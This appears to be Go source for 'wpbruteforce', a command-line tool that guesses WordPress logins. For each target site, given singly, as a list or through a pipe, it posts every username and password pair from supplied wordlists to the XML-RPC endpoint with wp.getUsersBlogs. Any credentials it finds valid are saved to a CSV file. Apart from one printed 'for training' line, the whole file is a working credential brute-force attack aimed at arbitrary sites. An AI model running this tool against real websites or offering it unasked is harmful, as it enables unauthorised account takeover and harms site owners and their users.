package main

import (
	"bufio"
	"bytes"
	"encoding/csv"
	"encoding/xml"
	"fmt"
	"github.com/TwiN/go-color"
	"github.com/urfave/cli/v2"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
)

type DomainResult struct {
	Domain   string
	UserName string
	Password string
}

var results []DomainResult

func writeResults(results []DomainResult, outputfile string) {

	file, err := os.Create(outputfile)
	if err != nil {
		panic(err)
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)
	// Write the results to a CSV file.
	writer := csv.NewWriter(file)
	defer writer.Flush()
	err = writer.Write([]string{"Domain", "UserName", "Password"})
	if err != nil {
		return
	}
	for _, result := range results {
		err = writer.Write([]string{result.Domain, result.UserName, result.Password})
		if err != nil {
			return
		}
	}
}

// readDomains reads domain names from a text file and returns them as a string slice.
func readDomains(filename string) []string {
	// Open the file.
	file, err := os.Open(filename)
	if err != nil {
		panic(err)
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)

	var domainss []string
	var InputText string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		InputText = scanner.Text()

		if !strings.HasPrefix(InputText, "https://") {
			if !strings.HasPrefix(InputText, "http://") {
				InputText = "https://" + InputText

			}

		}

		if !strings.HasSuffix(InputText, "xmlrpc.php") {
			InputText += "/xmlrpc.php"
		}
		// Add domain names to the list.
		domainss = append(domainss, InputText)

	}
	if err := scanner.Err(); err != nil {
		panic(err)
	}

	return domainss
}

func withlist(inputfile, userinput, passinput string) []DomainResult {
	domainadd := readDomains(inputfile)

	var result DomainResult
	for _, domain := range domainadd {

		// Check if port 80 is open for the domain.
		result = bruteforce(domain, userinput, passinput)

		if result.UserName != "NotFind" || result.Password != "NotFind" {

			results = append(results, result)
		}

	}
	return results
}
func withname(domain, userinput, passinput string) []DomainResult {
	var result DomainResult
	if !strings.HasPrefix(domain, "http://") {
		if !strings.HasPrefix(domain, "https://") {
			domain = "https://" + domain
		}
	}
	if !strings.HasSuffix(domain, "xmlrpc.php") {
		domain += "/xmlrpc.php"
	}
	result = bruteforce(domain, userinput, passinput)
	if result.UserName != "NotFind" || result.Password != "NotFind" {

		results = append(results, result)
	}
	// If port 80 or 443 is open, print a message and store the result.

	return results

}
func withpip(userinput, passinput string) []DomainResult {
	scanner := bufio.NewScanner(os.Stdin)
	var result DomainResult
	for scanner.Scan() {

		domain := scanner.Text()
		if !strings.HasPrefix(domain, "http://") {
			if !strings.HasPrefix(domain, "https://") {
				domain = "https://" + domain
			}
		}
		if !strings.HasSuffix(domain, "xmlrpc.php") {
			domain += "/xmlrpc.php"
		}
		// Check if port 80 is open for the domain.

		// Check if port 80 is open for the domain.
		result = bruteforce(domain, userinput, passinput)

		if result.UserName != "NotFind" || result.Password != "NotFind" {

			results = append(results, result)
		}

		// If port 80 or 443 is open, print a message and store the result.

	}

	return results
}

type MethodResponse struct {
	Fault Fault `xml:"fault"`
}

type Fault struct {
	Value Struct `xml:"value"`
}

type Struct struct {
	Members []Member `xml:"struct>member"`
}

type Member struct {
	Name  string `xml:"name"`
	Value Value  `xml:"value"`
}

type Value struct {
	IntValue    int    `xml:"int"`
	StringValue string `xml:"string"`
}

var outputs, inputs, domains, userinp, passinp string = "", "", "", "", ""

var pipel int

func main() {

	fmt.Println(color.Colorize(color.Red, "[*] This tool is for training."))
	fmt.Println(color.Colorize(color.Red, "[*]Enter wpbruteforce -h to show help"))
	app := &cli.App{
		Flags: []cli.Flag{
			&cli.StringFlag{
				Name:        "domain",
				Value:       "",
				Aliases:     []string{"d"},
				Usage:       "Enter just one domain",
				Destination: &domains,
			},
			&cli.StringFlag{
				Name:        "list",
				Value:       "",
				Aliases:     []string{"l"},
				Usage:       "Enter a list from text file",
				Destination: &inputs,
			},
			&cli.StringFlag{
				Name:        "userinput",
				Value:       "",
				Aliases:     []string{"u"},
				Usage:       "Enter a username wordlist",
				Destination: &userinp,
			},
			&cli.StringFlag{
				Name:        "passinput",
				Value:       "",
				Aliases:     []string{"w"},
				Usage:       "Enter a password wordlist",
				Destination: &passinp,
			},
			&cli.BoolFlag{
				Name:    "pipe",
				Aliases: []string{"p"},
				Usage:   "Enter just from pipe line",
				Count:   &pipel,
			},

			&cli.StringFlag{
				Name:        "output",
				Value:       "output.csv",
				Aliases:     []string{"o"},
				Usage:       "Enter output csv file name  ",
				Destination: &outputs,
			},
		},
		Action: func(cCtx *cli.Context) error {
			if domains != "" {
				results = withname(domains, userinp, passinp)
				writeResults(results, outputs)
			} else if inputs != "" {
				results = withlist(inputs, userinp, passinp)
				writeResults(results, outputs)
			} else if pipel > 0 {
				results = withpip(userinp, passinp)
				writeResults(results, outputs)
			}
			//	withlist("list", wg)
			return nil
		},
	}

	if err := app.Run(os.Args); err != nil {
		log.Fatal(err)
	}

}
func bruteforce(domain, userinput, passinput string) DomainResult {

	usernamesdic, err := os.OpenFile(userinput, os.O_RDONLY, 0600)
	defer usernamesdic.Close()
	if err != nil {
		log.Panic(err)
	} else {
		passwordsdic, err := os.OpenFile(passinput, os.O_RDONLY, 0600)
		defer passwordsdic.Close()
		if err != nil {
			println(err.Error())
		} else {
			passwordsdicbyte, err := ioutil.ReadAll(passwordsdic)
			if err != nil {
				fmt.Println(err.Error())
			}
			usernamesdicbyte, err := ioutil.ReadAll(usernamesdic)

			passwords := strings.Split(string(passwordsdicbyte), "\r\n")
			usernames := strings.Split(string(usernamesdicbyte), "\r\n")
			for _, usern := range usernames {

				for _, passw := range passwords {
					xmlreq := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>%s</value></param>
    <param><value>%s</value></param>
  </params>
</methodCall>`, usern, passw)

					xmlRequest := []byte(xmlreq)

					// Send the POST request.
					resp, err := http.Post(domain, "application/xml", bytes.NewBuffer(xmlRequest))
					if err != nil {
						fmt.Println(err)
						return DomainResult{Domain: domain,
							Password: "NotFind",
							UserName: "NotFind",
						}
					}
					defer resp.Body.Close()

					// Check the response status code.
					if resp.StatusCode == 200 {
						// Handle the response as needed.
						responseBody, err := ioutil.ReadAll(resp.Body)
						if err != nil {
							fmt.Println(err)
							return DomainResult{Domain: domain,
								Password: "NotFind",
								UserName: "NotFind",
							}
						}

						// Parse the XML-RPC response.
						var methodResponse MethodResponse
						err = xml.Unmarshal(responseBody, &methodResponse)
						if err != nil {
							fmt.Println(err.Error())
							return DomainResult{Domain: domain,
								Password: "NotFind",
								UserName: "NotFind",
							}
						}

						// Extract faultCode and faultString values.
						var faultCode int

						for _, member := range methodResponse.Fault.Value.Members {
							switch member.Name {
							case "faultCode":
								faultCode = member.Value.IntValue

							}
						}

						//fmt.Printf("Fault Code: %v\n", faultCode)
						//fmt.Printf("Fault String: %s\n", faultString)
						if faultCode != 403 {

							fmt.Printf("Username %s and Password %s is Valid", usern, passw)
							return DomainResult{Domain: domain,
								UserName: usern,
								Password: passw,
							}
						} else {
							fmt.Println(color.Colorize(color.Red, "[-] UserName Or Password is wrong"+strconv.Itoa(faultCode)))
							//fmt.Println(faultString)
						}
					} else {
						fmt.Println("HTTP Status Code:", resp.StatusCode)
						fmt.Println("XML-RPC Request Failed")
					}
				}
			}
		}
	}
	return DomainResult{Domain: domain,
		Password: "NotFind",
		UserName: "NotFind",
	}
}
